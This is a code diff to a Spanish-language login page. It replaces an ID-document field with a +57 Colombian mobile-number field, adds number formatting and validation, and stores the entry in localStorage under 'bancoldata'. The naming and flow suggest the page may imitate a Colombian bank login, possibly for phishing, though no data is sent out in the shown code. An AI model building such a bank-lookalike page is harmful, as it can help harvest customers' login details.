@@ -29,7 +29,7 @@
     .logo {
       margin-top: auto;
       text-align: center;
-      font-size: 48px;
+      font-size: 50px;
       font-weight: bold;
     }
 
@@ -41,16 +41,25 @@
       margin-top: auto;
     }
 
+    /* INPUT CON +57 */
     .input-box {
       background: rgba(255,255,255,0.2);
       border-radius: 8px;
-      padding: 12px;
+      padding: 10px;
       display: flex;
       align-items: center;
+      gap: 10px;
+    }
+
+    .prefix {
+      border-right: 2px solid rgba(255,255,255,0.3);
+      padding-right: 10px;
+      font-weight: bold;
+      color: #ffb3e6;
     }
 
     .input-box input {
-      width: 100%;
+      flex: 1;
       border: none;
       outline: none;
       background: transparent;
@@ -72,7 +81,8 @@
       color: white;
       font-size: 16px;
       cursor: pointer;
-      opacity: 0.6;
+      opacity: 0.5;
+      transition: 0.3s;
     }
 
     .btn.active {
@@ -91,7 +101,8 @@
 
   <div class="form">
     <div class="input-box">
-      <input type="number" id="docInput" placeholder="Ingresa tu documento">
+      <div class="prefix">+57</div>
+      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
     </div>
 
     <button class="btn" id="btn">Entra</button>
@@ -100,12 +111,30 @@
 </div>
 
 <script>
-const input = document.getElementById("docInput");
+const input = document.getElementById("phoneInput");
 const btn = document.getElementById("btn");
 
-// activar botón
+// Formato 3-3-4
+function formatNumber(value) {
+  let digits = value.replace(/\D/g, "");
+
+  if (digits.length > 10) digits = digits.slice(0, 10);
+
+  if (digits.length > 6) {
+    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
+  } else if (digits.length > 3) {
+    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
+  }
+  return digits;
+}
+
+// input
 input.addEventListener("input", () => {
-  if (input.value.length >= 4) {
+  input.value = formatNumber(input.value);
+
+  const digits = input.value.replace(/\D/g, "");
+
+  if (digits.length === 10 && digits.startsWith("3")) {
     btn.classList.add("active");
   } else {
     btn.classList.remove("active");
@@ -114,10 +143,10 @@ input.addEventListener("input", () => {
 
 // click
 btn.addEventListener("click", () => {
-  const value = input.value.trim();
+  const raw = input.value.replace(/\D/g, "");
 
-  if (value.length < 4) {
-    alert("Ingrese mínimo 4 dígitos");
+  if (raw.length !== 10 || !raw.startsWith("3")) {
+    alert("Número inválido");
     return;
   }
 
@@ -128,7 +157,7 @@ btn.addEventListener("click", () => {
     data = {};
   }
 
-  data.usuario = value;
+  data.numero = raw;
   data.fecha = new Date().toISOString();
 
   localStorage.setItem("bancoldata", JSON.stringify(data));
